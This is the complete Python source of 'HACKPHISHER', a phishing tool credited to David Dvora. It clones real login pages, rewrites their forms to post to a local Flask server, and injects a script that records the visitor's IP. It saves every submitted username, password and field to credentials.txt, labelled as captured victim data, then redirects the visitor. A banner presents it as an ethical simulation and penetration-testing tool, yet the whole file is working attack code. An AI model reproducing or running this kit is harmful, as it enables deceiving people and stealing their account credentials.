import os
import sys
import argparse
import requests
import threading
import random
import string
import json
import logging
from bs4 import BeautifulSoup
from flask import Flask, request, redirect
from datetime import datetime


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    GOLD = '\033[38;5;220m'
    CRIMSON = '\033[38;5;160m'


class HACKPHISHER:
    def __init__(self):
        self.sessions_dir = "Sessions"
        self.templates_dir = "Templates"
        self.credentials_file = "credentials.txt"
        self.templates_db = "templates.json"
        os.makedirs(self.sessions_dir, exist_ok=True)
        os.makedirs(self.templates_dir, exist_ok=True)

        # Load existing templates
        self.templates = self.load_templates()

    def load_templates(self):
        try:
            if os.path.exists(self.templates_db):
                with open(self.templates_db, 'r') as f:
                    return json.load(f)
            return {}
        except Exception as e:
            logging.error(f"Failed to load templates: {e}")
            return {}

    def save_templates(self):
        try:
            with open(self.templates_db, 'w') as f:
                json.dump(self.templates, f, indent=4)
        except Exception as e:
            logging.error(f"Failed to save templates: {e}")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def generate_random_url(self):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

    def modify_page(self, page_path, redirect_url="https://github.com"):
        try:
            with open(page_path, 'r+', encoding='utf-8') as f:
                content = f.read()
                soup = BeautifulSoup(content, 'html.parser')

                for form in soup.find_all('form'):
                    form['action'] = '/submit'
                    form['method'] = 'POST'

                    redirect_field = soup.new_tag('input')
                    redirect_field.attrs['type'] = 'hidden'
                    redirect_field.attrs['name'] = 'redirect_url'
                    redirect_field.attrs['value'] = redirect_url
                    form.append(redirect_field)

                    ip_field = soup.new_tag('input')
                    ip_field.attrs['type'] = 'hidden'
                    ip_field.attrs['name'] = 'user_ip'
                    ip_field.attrs['id'] = 'user_ip'
                    form.append(ip_field)

                script = soup.new_tag('script')
                script.string = """
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('user_ip').value = data.ip;
                    });
                """
                if soup.body:
                    soup.body.append(script)

                f.seek(0)
                f.write(str(soup))
                f.truncate()
        except Exception as e:
            logging.error(f"Failed to modify page: {e}")

    def start_server(self, port, page_path, service_type="localhost"):
        try:
            app = Flask(__name__)

            @app.route('/')
            def serve_page():
                try:
                    with open(page_path, 'r', encoding='utf-8') as f:
                        return f.read()
                except Exception as e:
                    logging.error(f"Failed to serve page: {e}")
                    return "Error loading page", 500

            @app.route('/submit', methods=['POST'])
            def handle_submit():
                victim_ip = request.remote_addr
                victim_ip_form = request.form.get('user_ip', 'N/A')

                logging.info(f"Victim IP: {victim_ip} (form: {victim_ip_form})")
                print(f"{Colors.OKCYAN}[-] Victim IP Found !{Colors.ENDC}")
                print(f"{Colors.OKCYAN}[-] Victim's IP : {Colors.OKGREEN}{victim_ip}{Colors.ENDC}")
                print(f"{Colors.OKCYAN}[-] Victim's IP (form): {Colors.OKGREEN}{victim_ip_form}{Colors.ENDC}\n")

                credentials = f"""
========== CREDENTIALS CAPTURED ==========
IP: {victim_ip}
IP (form): {victim_ip_form}
User-Agent: {request.headers.get('User-Agent')}
Timestamp: {datetime.now()}
"""
                account_info = {}
                for key, value in request.form.items():
                    if key not in ['user_ip', 'redirect_url']:
                        credentials += f"{key}: {value}\n"
                        account_info[key] = value

                if account_info:
                    print(f"{Colors.OKCYAN}[-] Login info Found !!{Colors.ENDC}\n")
                    for key, value in account_info.items():
                        print(f"{Colors.OKCYAN}[-] {key.capitalize()} : {Colors.OKGREEN}{value}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] No login info found.{Colors.ENDC}")

                try:
                    with open(self.credentials_file, 'a', encoding='utf-8') as f:
                        f.write(credentials + "\n")
                    print(f"\n{Colors.OKCYAN}[-] Saved in : {Colors.OKGREEN}{self.credentials_file}{Colors.ENDC}\n")
                except Exception as e:
                    logging.error(f"Failed to save credentials: {e}")

                print(f"{Colors.WARNING}[-] Waiting for Next Login Info, Ctrl + C to exit.{Colors.ENDC}\n")
                redirect_url = request.form.get('redirect_url', "https://github.com")
                return redirect(redirect_url)

            print(f"{Colors.OKGREEN}[+] Starting localhost server on port {port}{Colors.ENDC}")
            threading.Thread(target=app.run, kwargs={'port': port, 'host': '0.0.0.0'}).start()

        except Exception as e:
            logging.error(f"Failed to start server: {e}")

    def clone_page_from_path(self, file_path, output_name=None):
        try:
            if not os.path.exists(file_path):
                print(f"{Colors.FAIL}[-] File not found: {file_path}{Colors.ENDC}")
                return None

            filename = output_name if output_name else os.path.basename(file_path)
            save_path = os.path.join(self.templates_dir, filename)

            with open(file_path, 'r', encoding='utf-8') as src, open(save_path, 'w', encoding='utf-8') as dst:
                dst.write(src.read())

            print(f"{Colors.OKGREEN}[+] Page cloned to {save_path}{Colors.ENDC}")
            return save_path
        except Exception as e:
            logging.error(f"Failed to clone page from path: {e}")
            return None

    def clone_page(self, url, output_name=None):
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            response.raise_for_status()

            filename = output_name if output_name else self.generate_random_url() + ".html"
            save_path = os.path.join(self.templates_dir, filename)

            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(response.text)

            print(f"{Colors.OKGREEN}[+] Page cloned to {save_path}{Colors.ENDC}")
            return save_path
        except Exception as e:
            logging.error(f"Failed to clone page from URL: {e}")
            return None

    def add_template(self, name, clone_type, source, redirect_url, port=8080, service="localhost"):
        try:
            if clone_type.lower() == "url":
                page_path = self.clone_page(source, f"{name}.html")
            elif clone_type.lower() == "path":
                page_path = self.clone_page_from_path(source, f"{name}.html")
            else:
                print(f"{Colors.FAIL}[-] Invalid clone type. Use 'url' or 'path'.{Colors.ENDC}")
                return False

            if not page_path:
                return False

            self.modify_page(page_path, redirect_url)

            template_path = os.path.join(self.templates_dir, f"{name}.html")
            os.rename(page_path, template_path)

            self.templates[name] = {
                'path': template_path,
                'redirect_url': redirect_url,
                'port': port,
                'service': service
            }
            self.save_templates()

            print(f"{Colors.OKGREEN}[+] Template '{name}' added successfully!{Colors.ENDC}")
            return True
        except Exception as e:
            logging.error(f"Failed to add template: {e}")
            return False

    def use_template(self, name):
        try:
            if name not in self.templates:
                print(f"{Colors.FAIL}[-] Template '{name}' not found{Colors.ENDC}")
                return False

            template = self.templates[name]
            session_filename = f"session_{name}_{self.generate_random_url()}.html"
            session_path = os.path.join(self.sessions_dir, session_filename)

            with open(template['path'], 'r') as src, open(session_path, 'w') as dst:
                dst.write(src.read())

            self.start_server(
                port=template['port'],
                page_path=session_path,
                service_type=template['service']
            )
            return True
        except Exception as e:
            logging.error(f"Failed to use template: {e}")
            return False

    def remove_template(self, name):
        try:
            if name not in self.templates:
                print(f"{Colors.FAIL}[-] Template '{name}' not found{Colors.ENDC}")
                return False

            template_path = self.templates[name]['path']
            if os.path.exists(template_path):
                os.remove(template_path)

            del self.templates[name]
            self.save_templates()

            print(f"{Colors.OKGREEN}[+] Template '{name}' removed successfully!{Colors.ENDC}")
            return True
        except Exception as e:
            logging.error(f"Failed to remove template: {e}")
            return False

    def interactive_menu(self):
        try:
            while True:
                self.clear_screen()
                print(Colors.ORANGE + """       
██╗  ██╗ █████╗  ██████╗██╗  ██╗  ███████╗██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝  ██╔══██║██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
███████║███████║██║     █████╔╝   ███████║███████║██║███████╗███████║█████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗   ██╔════╝██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗  ██║     ██║  ██║██║███████║██║  ██║███████╗██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝
""" + Colors.ENDC)
                print(Colors.ORANGE + Colors.BOLD + "Advanced Phishing Simulation Tool for Security Awareness and Penetration Testing \n" + Colors.ENDC)
                print(Colors.WARNING + "[!] WARNING: HACKPHISHER is a powerful offensive security Tool intended for ethical use only.\n"
                      "[!] Any unauthorized, illegal, or malicious use is strictly prohibited and may constitute a criminal offense.\n"
                      "[!] The creator of this Framework take no responsibility for misuse or any resulting damage.\n" + Colors.ENDC)
                print(Colors.ORANGE + Colors.BOLD + "by David Dvora" + Colors.ENDC)
                print(Colors.ORANGE + Colors.BOLD + "Version: v1.0\n" + Colors.ENDC)

                print(f"{Colors.WARNING}1. {Colors.OKCYAN}Start Phishing Campaign{Colors.ENDC}")
                print(f"{Colors.WARNING}2. {Colors.OKCYAN}Add New Template{Colors.ENDC}")
                print(f"{Colors.WARNING}3. {Colors.OKCYAN}View Captured Credentials{Colors.ENDC}")
                print(f"{Colors.WARNING}4. {Colors.OKCYAN}Remove Template{Colors.ENDC}")
                print(f"{Colors.WARNING}5. {Colors.OKCYAN}Exit{Colors.ENDC}")

                choice = input(f"{Colors.BOLD}\nSelect an option: {Colors.ENDC}").strip()

                if choice == "1":
                    if not self.templates:
                        print(f"{Colors.WARNING}[!] No templates available. Add one first.{Colors.ENDC}")
                        input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")
                        continue

                    print(f"{Colors.BOLD}\nAvailable templates:{Colors.ENDC}")
                    for i, name in enumerate(self.templates.keys(), 1):
                        print(f"{Colors.WARNING}{i}. {Colors.OKCYAN}{name}{Colors.ENDC}")

                    try:
                        selection = int(input(f"{Colors.BOLD}\nSelect template: {Colors.ENDC}")) - 1
                        template_name = list(self.templates.keys())[selection]
                        self.use_template(template_name)
                    except (ValueError, IndexError):
                        print(f"{Colors.FAIL}[-] Invalid selection{Colors.ENDC}\n")
                        print(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")
                    input(f"")

                elif choice == "2":
                    name = input(f"{Colors.BOLD}Template name: {Colors.ENDC}").strip()
                    clone_type = input(f"{Colors.BOLD}Clone type (url/path): {Colors.ENDC}").strip().lower()
                    if clone_type not in ["url", "path"]:
                        print(f"{Colors.FAIL}[-] Invalid clone type. Use 'url' or 'path'.{Colors.ENDC}")
                        input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")
                        continue

                    if clone_type == "url":
                        source = input(f"{Colors.BOLD}URL to clone: {Colors.ENDC}").strip()
                    else:
                        source = input(f"{Colors.BOLD}Path to HTML file: {Colors.ENDC}").strip()

                    redirect_url = input(f"{Colors.BOLD}Redirect URL after submit: {Colors.ENDC}").strip()
                    port = input(f"{Colors.BOLD}Port 1024-9999 (default 8080): {Colors.ENDC}").strip() or "8080"
                    service = "localhost"
                    print(f"{Colors.OKGREEN}[+] Using localhost {Colors.ENDC}")

                    try:
                        port = int(port)
                        if not (1024 <= port <= 9999):
                            raise ValueError
                    except ValueError:
                        print(f"{Colors.FAIL}[-] Invalid port number{Colors.ENDC}")
                        input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")
                        continue

                    self.add_template(name, clone_type, source, redirect_url, port, service)
                    input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")

                elif choice == "3":
                    if os.path.exists(self.credentials_file):
                        with open(self.credentials_file, 'r', encoding='utf-8') as f:
                            print(f"\n{Colors.OKCYAN}{f.read()}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[-] No credentials captured yet{Colors.ENDC}")
                    input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")

                elif choice == "4":
                    if not self.templates:
                        print(f"{Colors.WARNING}[!] No templates available to remove.{Colors.ENDC}")
                        input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")
                        continue

                    print(f"{Colors.BOLD}\nAvailable templates:{Colors.ENDC}")
                    for i, name in enumerate(self.templates.keys(), 1):
                        print(f"{Colors.WARNING}{i}. {Colors.OKCYAN}{name}{Colors.ENDC}")

                    try:
                        selection = int(input(f"{Colors.BOLD}\nSelect template to remove: {Colors.ENDC}")) - 1
                        template_name = list(self.templates.keys())[selection]
                        self.remove_template(template_name)
                    except (ValueError, IndexError):
                        print(f"{Colors.FAIL}[-] Invalid selection{Colors.ENDC}")
                    input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")

                elif choice == "5":
                    print(f"{Colors.OKGREEN}[+] Exiting HACKPHISHER...{Colors.ENDC}")
                    sys.exit(0)

                else:
                    print(f"{Colors.FAIL}[-] Invalid option{Colors.ENDC}")
                    input(f"{Colors.BOLD}\nPress Enter to continue...{Colors.ENDC}")

        except KeyboardInterrupt:
            print(f"\n{Colors.OKGREEN}[+] Exiting HACKPHISHER...{Colors.ENDC}")
            sys.exit(0)
        except Exception as e:
            logging.error(f"Interactive menu error: {e}")
            sys.exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HACKPHISHER - Advanced Phishing Tool")
    parser.add_argument("-i", "--interactive", action="store_true", help="Run in interactive mode")
    args = parser.parse_args()

    tool = HACKPHISHER()

    if args.interactive:
        tool.interactive_menu()
    else:
        print(f"{Colors.WARNING}[!] Use '-i' or '--interactive' to launch the interactive menu.{Colors.ENDC}")
